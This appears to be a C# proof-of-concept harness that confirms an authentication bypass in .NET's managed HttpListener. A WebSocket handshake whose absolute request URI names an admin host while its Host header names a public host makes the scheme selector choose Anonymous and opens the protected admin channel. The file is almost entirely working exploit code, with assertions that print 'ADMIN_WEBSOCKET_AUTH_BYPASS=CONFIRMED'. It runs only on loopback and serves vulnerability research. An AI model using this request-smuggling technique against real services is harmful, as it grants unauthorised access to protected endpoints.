using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

record Result(
    string Name,
    string FirstLine,
    bool BasicChallenge,
    bool ContextDelivered,
    AuthenticationSchemes Selected,
    string SelectorUserHost,
    string SelectorUrlHost,
    bool IsWebSocketRequest,
    bool SwitchingProtocols,
    bool AdminWsSentinel);

class Program
{
    private const string WsSentinel = "ADMIN_WS_CHANNEL_ESTABLISHED_5d91";

    static int FreePort()
    {
        using var l=new TcpListener(IPAddress.Loopback,0);
        l.Start();
        int p=((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return p;
    }

    static async Task<byte[]> ReadUntilQuiet(NetworkStream ns)
    {
        using var ms=new MemoryStream();
        byte[] buffer=new byte[8192];
        using var cts=new CancellationTokenSource(TimeSpan.FromSeconds(5));

        try
        {
            while(true)
            {
                int n=await ns.ReadAsync(buffer,cts.Token);
                if(n==0) break;
                await ms.WriteAsync(buffer.AsMemory(0,n),cts.Token);

                if(ms.Length>0 && !ns.DataAvailable)
                    await Task.Delay(100,cts.Token);

                if(ms.Length>0 && !ns.DataAvailable)
                    break;
            }
        }
        catch(OperationCanceledException) {}
        return ms.ToArray();
    }

    static string FirstHttpLine(byte[] wire)
    {
        string s=Encoding.ASCII.GetString(wire);
        return s.Split(new[]{"\r\n","\n"},StringSplitOptions.None)[0];
    }

    static bool ContainsAscii(byte[] wire,string value) =>
        Encoding.ASCII.GetString(wire).Contains(value,StringComparison.OrdinalIgnoreCase);

    static async Task<Result> Run(string name, bool conflicting)
    {
        int port=FreePort();

        using var listener=new HttpListener();
        listener.Prefixes.Add($"http://public.test:{port}/");
        listener.Prefixes.Add($"http://admin.test:{port}/");
        listener.AuthenticationSchemes=AuthenticationSchemes.None;
        listener.Realm="admin-ws-research";

        string selectorUserHost="<not-called>";
        string selectorUrlHost="<not-called>";
        AuthenticationSchemes selected=AuthenticationSchemes.None;

        listener.AuthenticationSchemeSelectorDelegate=request =>
        {
            selectorUserHost=request.UserHostName ?? "<null>";
            selectorUrlHost=request.Url?.Host ?? "<null>";
            string hostOnly=selectorUserHost.Split(':')[0];

            selected=string.Equals(hostOnly,"public.test",StringComparison.OrdinalIgnoreCase)
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Basic;

            Console.WriteLine($"SELECTOR case={name} UserHostName={selectorUserHost} Url.Host={selectorUrlHost} Selected={selected}");
            return selected;
        };

        listener.Start();
        Task<HttpListenerContext> contextTask=listener.GetContextAsync();

        using var client=new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback,port);
        using NetworkStream ns=client.GetStream();

        string requestTarget=conflicting
            ? $"http://admin.test:{port}/ws"
            : "/ws";

        string host=conflicting ? $"public.test:{port}" : $"admin.test:{port}";

        string raw=
            $"GET {requestTarget} HTTP/1.1\r\n"+
            $"Host: {host}\r\n"+
            "Upgrade: websocket\r\n"+
            "Connection: Upgrade\r\n"+
            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"+
            "Sec-WebSocket-Version: 13\r\n"+
            "\r\n";

        await ns.WriteAsync(Encoding.ASCII.GetBytes(raw));
        await ns.FlushAsync();

        Task<byte[]> wireTask=ReadUntilQuiet(ns);
        Task first=await Task.WhenAny(contextTask,wireTask,Task.Delay(5000));

        bool delivered=false;
        bool isWs=false;

        if(first==contextTask && contextTask.IsCompletedSuccessfully)
        {
            delivered=true;
            HttpListenerContext ctx=await contextTask;
            isWs=ctx.Request.IsWebSocketRequest;

            Console.WriteLine(
                $"CONTEXT case={name} UserHostName={ctx.Request.UserHostName} Url.Host={ctx.Request.Url?.Host} User={(ctx.User is null ? "ANONYMOUS" : "AUTHENTICATED")} IsWebSocket={isWs}");

            if(isWs && string.Equals(ctx.Request.Url?.Host,"admin.test",StringComparison.OrdinalIgnoreCase))
            {
                HttpListenerWebSocketContext wsContext=await ctx.AcceptWebSocketAsync(subProtocol:null);
                byte[] msg=Encoding.UTF8.GetBytes(WsSentinel);
                await wsContext.WebSocket.SendAsync(
                    new ArraySegment<byte>(msg),
                    WebSocketMessageType.Text,
                    endOfMessage:true,
                    CancellationToken.None);

                await wsContext.WebSocket.CloseOutputAsync(
                    WebSocketCloseStatus.NormalClosure,
                    "done",
                    CancellationToken.None);
            }
            else
            {
                ctx.Response.StatusCode=200;
                ctx.Response.Close();
            }
        }

        byte[] wire=await wireTask;
        string firstLine=FirstHttpLine(wire);
        bool basic=ContainsAscii(wire,"WWW-Authenticate: Basic");
        bool switching=firstLine.Contains("101",StringComparison.Ordinal);
        bool sentinel=ContainsAscii(wire,WsSentinel);

        Console.WriteLine(
            $"RESULT case={name} first={firstLine} basicChallenge={basic} context={delivered} selected={selected} selectorUserHost={selectorUserHost} selectorUrlHost={selectorUrlHost} isWebSocket={isWs} switchingProtocols={switching} adminWsSentinel={sentinel}");

        listener.Close();

        return new Result(name,firstLine,basic,delivered,selected,selectorUserHost,selectorUrlHost,isWs,switching,sentinel);
    }

    static void Require(bool condition,string message)
    {
        if(!condition) throw new Exception("ASSERTION_FAILED: "+message);
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        Result adminControl=await Run("ADMIN_WS_CONTROL",conflicting:false);
        Result attack=await Run("ABSOLUTE_ADMIN_WS_HOST_PUBLIC",conflicting:true);

        Require(adminControl.FirstLine.Contains("401"),"ordinary admin WebSocket handshake must be challenged");
        Require(adminControl.BasicChallenge,"ordinary admin WebSocket handshake must include Basic challenge");
        Require(!adminControl.ContextDelivered,"ordinary unauthenticated admin WebSocket must not reach application context");
        Require(!adminControl.SwitchingProtocols && !adminControl.AdminWsSentinel,
            "ordinary unauthenticated admin WebSocket must not establish protected channel");

        if(OperatingSystem.IsWindows())
        {
            Require(attack.FirstLine.Contains("401"),"Windows conflict must return 401");
            Require(attack.BasicChallenge,"Windows conflict must include Basic challenge");
            Require(attack.Selected==AuthenticationSchemes.Basic,"Windows selector must select Basic");
            Require(!attack.ContextDelivered && !attack.SwitchingProtocols && !attack.AdminWsSentinel,
                "Windows must not establish admin WebSocket");
            Console.WriteLine("ADMIN_WEBSOCKET_WINDOWS_NEGATIVE_CONTROL=PASS");
        }
        else
        {
            Require(attack.FirstLine.Contains("101"),"managed conflict must complete WebSocket upgrade");
            Require(!attack.BasicChallenge,"managed conflict must omit Basic challenge");
            Require(attack.Selected==AuthenticationSchemes.Anonymous,"managed selector must choose Anonymous");
            Require(attack.ContextDelivered && attack.IsWebSocketRequest,
                "managed conflict must deliver admin WebSocket context");
            Require(attack.SelectorUserHost.StartsWith("public.test",StringComparison.OrdinalIgnoreCase),
                "selector must see stale public Host");
            Require(string.Equals(attack.SelectorUrlHost,"admin.test",StringComparison.OrdinalIgnoreCase),
                "selector must simultaneously see admin Url authority");
            Require(attack.SwitchingProtocols && attack.AdminWsSentinel,
                "protected admin WebSocket channel must be established anonymously");

            Console.WriteLine("ADMIN_WEBSOCKET_AUTH_BYPASS=CONFIRMED");
        }
    }
}
